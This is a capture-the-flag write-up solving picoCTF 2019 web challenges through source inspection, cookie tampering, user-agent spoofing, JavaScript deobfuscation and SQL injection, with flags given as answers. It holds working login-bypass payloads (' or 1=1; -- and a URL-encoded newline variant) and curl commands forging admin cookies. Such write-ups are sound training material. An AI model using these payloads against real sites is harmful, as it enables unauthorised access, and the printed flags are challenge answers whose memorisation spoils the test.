# WebExploitation

## Insp3ct0r (50 points)

Kishor Balan tipped us off that the following code may need inspection: `https://2019shell1.picoctf.com/problem/52962/` (link) or `http://2019shell1.picoctf.com:52962`

FLAG: `picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?39dd9e36}`

It is hinted that the website is created using HTML, CSS, and JavaScript. View the source of the page, we will see at the end of the page:

```html
<!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 -->
```

Do the same for the CSS and JavaScript.

At the end of `mycss.css`, we see:

```css
/* You need CSS to make pretty pages. Here's part 2/3 of the flag: t3ct1ve_0r_ju5t */
```

At the end of `myjs.js`, we see:

```javascript
/* Javascript sure is neat. Anyways part 3/3 of the flag: _lucky?39dd9e36} */
```

Combining the three messages, we have the flag: `picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?39dd9e36}`.

## dont-use-client-side (100 points)

Can you break into this super secure portal? `https://2019shell1.picoctf.com/problem/12280/` (link) or `http://2019shell1.picoctf.com:12280`

FLAG: `picoCTF{no_clients_plz_577431}`

This webpage asks for a credential and checks it.

Check the JavaScript attached to this webpage, we see the following function:

```javascript
function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
        if (checkpass.substring(split*6, split*7) == '7743') {
            if (checkpass.substring(split, split*2) == 'CTF{') {
                if (checkpass.substring(split*4, split*5) == 'ts_p') {
                    if (checkpass.substring(split*3, split*4) == 'lien') {
                        if (checkpass.substring(split*5, split*6) == 'lz_5') {
                            if (checkpass.substring(split*2, split*3) == 'no_c') {
                                if (checkpass.substring(split*7, split*8) == '1}') {
                                    alert("Password Verified")
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    else {
        alert("Incorrect password");
    }
}
```

Combine those pieces of string and reorganize to get the original password: `picoCTF{no_clients_plz_577431}`.

## logon (100 points)

The factory is hiding things from all of its users. Can you login as logon and find what they've been looking at? `https://2019shell1.picoctf.com/problem/47307/` (link) or `http://2019shell1.picoctf.com:47307`

FLAG: `picoCTF{th3_c0nsp1r4cy_l1v3s_95e4b2d5}`

Let's first look at the actual request that gets sent to the login page.

Try to set the username to be 'aaa' and password to be 'bbb'. Notice that the cookies look like follows:

```txt
password=bbb; username=aaa; admin=False
```

It's weird because we didn't actually set the option for admin. Hence, let's set admin to be 'True' and resend the request.

Note that the request is sent to `/login` and then to `/flag`. The url for the `/flag` page should be `http://2019shell1.picoctf.com:47307/flag`.

Type the following command in Bash:

```bash
$ curl http://2019shell1.picoctf.com:47307/flag -v --cookie 'admin=True;username=;password=;'
```

We will get the following response:

```txt
*   Trying 3.15.247.173...
* TCP_NODELAY set
* Connected to 2019shell1.picoctf.com (3.15.247.173) port 47307 (#0)
> GET /flag HTTP/1.1
> Host: 2019shell1.picoctf.com:47307
> User-Agent: curl/7.64.1
> Accept: */*
> Cookie: admin=True;username=;password=;
> 
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 1312
< Set-Cookie: password=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Path=/
< Set-Cookie: username=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Path=/
< Set-Cookie: admin=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Path=/
< 
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Factory Login</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation" class="active"><a href="/">Home</a>
                    </li>
                    <li role="presentation"><a href="/logout" class="btn btn-link pull-right">Sign Out</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Factory Login</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_95e4b2d5}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF 2019</p>
        </footer>

    </div>
</body>

* Connection #0 to host 2019shell1.picoctf.com left intact
</html>* Closing connection 0
```

Hence, the flag is `picoCTF{th3_c0nsp1r4cy_l1v3s_95e4b2d5}`.

We can also pipe the result to grep to help us directly find the flag:

`$ curl http://2019shell1.picoctf.com:47307/flag -v --cookie 'admin=True;username=;password=;' 2>/dev/null | grep -e 'picoCTF{.*}' -o`

## where are the robots (100 points)

Can you find the robots? `https://2019shell1.picoctf.com/problem/21868/` (link) or `http://2019shell1.picoctf.com:21868`

FLAG: `picoCTF{ca1cu1at1ng_Mach1n3s_e0779}`

First, we look up the whole website. After checking the html, css, js, cache, network requests, we notice nothing special.

On the page, it says:

> Where are the robots

This is actually a hint. Google uses web scrawlers to find web pages and website owners can specify which path they don't want google to fetch in a file called `robots.txt` and place it under the root dir of the website.

Let's go to `https://2019shell1.picoctf.com/problem/21868/robots.txt`. We will see the following message:

```txt
User-agent: *
Disallow: /e0779.html
```

Let's go to `https://2019shell1.picoctf.com/problem/21868/e0779.html`. The flag is shown as `picoCTF{ca1cu1at1ng_Mach1n3s_e0779}`.

## Client-side-again (200 points)

FLAG: `picoCTF{not_this_again_d29871}`

Viewing the source of the html page, we have the following JavaScript code:

```javascript
(function(_0x4bd822, _0x2bd6f7) {
    var _0xb4bdb3 = function(_0x1d68f6) {
        while (--_0x1d68f6) {
            _0x4bd822['push'](_0x4bd822['shift']());
        }
    };
    _0xb4bdb3(++_0x2bd6f7);
}(_0x5a46, 0x1b3));

var _0x4b5b = function(_0x2d8f05, _0x4b81bb) {
    _0x2d8f05 = _0x2d8f05 - 0x0;
    var _0x4d74cb = _0x5a46[_0x2d8f05];
    return _0x4d74cb;
};

function verify() {
    checkpass = document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];
    split = 0x4;
    if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3')) {
        if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n') {
            if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4')) {
                if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT') {
                    if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5')) {
                        if (checkpass['substring'](0x6, 0xb) == 'F{not') {
                            if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6')) {
                                if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7')) {
                                    alert(_0x4b5b('0x8'));
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        alert(_0x4b5b('0x9'));
    }
}
```

As you can see, the variable and function names are obfuscated. Let's use the inspector to help us understand what the code is doing.

```javascript
-> _0x4b5b('0x0')
<- "getElementById"
-> document[_0x4b5b('0x0')]
<- f getDocumentById()
-> _0x4b5b('0x1')
<- "value"
```

Hence, we know that code `checkpass = document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];` is simply getting the password from the input tag.

Use the same strategy, we also know that

```txt
_0x4b5b('0x2') => "substring"
_0x4b5b('0x3') => "picoCTF{"
_0x4b5b('0x4') => "not_this"
_0x4b5b('0x5') => "29871}"
_0x4b5b('0x6') => "_again_d"
_0x4b5b('0x7') => "this"
_0x4b5b('0x8') => "Password Verified"
_0x4b5b('0x9') => "Incorrect password"
```

Therefore, we know the following substring mapping:

```txt
checkpass[0:8] = "picoCTF{"
checkpass[7:9] = "{n"
checkpass[8:16] = "not_this"
checkpass[3:6] = "oCT"
checkpass[24:32] = "29871}"
checkpass[6:11] = "F{not"
checkpass[16:24] = "_again_d"
checkpass[12:16] = "this"
```

Hence, the flag is `picoCTF{not_this_again_d29871}`.

## Open-to-admins (200 points)

This secure website allows users to access the flag only if they are admin and if the time is exactly 1400. `https://2019shell1.picoctf.com/problem/47265/` (link) or `http://2019shell1.picoctf.com:47265`

FLAG: `picoCTF{0p3n_t0_adm1n5_00cd0fe1}`

Set the cookie `admin=True` and `time=1400`. Click the flag button and it's done.

## picobrowser (200 points)

This website can be rendered only by picobrowser, go and catch the flag! `https://2019shell1.picoctf.com/problem/37829/` (link) or `http://2019shell1.picoctf.com:37829`

FLAG: `picoCTF{p1c0_s3cr3t_ag3nt_7e9c671a}`

According to the hint, we need to change the user-agent to `picobrowser` to be given access to the flag.

Hence, we can use the following command to fetch the flag.

```bash
$ curl -s -A 'picobrowser' http://2019shell1.picoctf.com:37829/flag | grep -e 'picoCTF{.*}' -o
```

We will get the result: `picoCTF{p1c0_s3cr3t_ag3nt_7e9c671a}`.

## Irish-Name-Repo 1 (300 points)

There is a website running at `https://2019shell1.picoctf.com/problem/47253/` (link) or `http://2019shell1.picoctf.com:47253`. Do you think you can log us in? Try to see if you can login!

FLAG: `picoCTF{s0m3_SQL_93e76603}`

This is a really simple SQL injection problem. Use the following username and password:

```txt
username: aaa
password: ' or 1=1; --
```

Note: username can be whater string. Doesn't matter.

We will then get the following result:

```txt
Logged in!
Your flag is: picoCTF{s0m3_SQL_93e76603}
```

## Irish-Name-Repo 2 (350 points)

There is a website running at `https://2019shell1.picoctf.com/problem/7411/` (link). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or `http://2019shell1.picoctf.com:7411`

FLAG: `picoCTF{m0R3_SQL_plz_c1c3dff7}`

The original injection payload doesn't work. It seems like now regex filtering has been performed on both the username and password.

One thing we need to notice is that the regex fails to think about the occurrence of space charater. Hence, what we can do is to urlencode the payload and send it through command line request as follows:

```bash
$ curl -X POST -d "username=%27%0Aor%201=1%3B%20--&password=bbb&debug=0" https://2019shell1.picoctf.com/problem/7411/login.php
```

The encoded username is as follows:

```txt
%27%0Aor%201=1%3B%20-- => '\nor 1=1; --
```

We then get the result:

```txt
<h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c1c3dff7}</p>
```

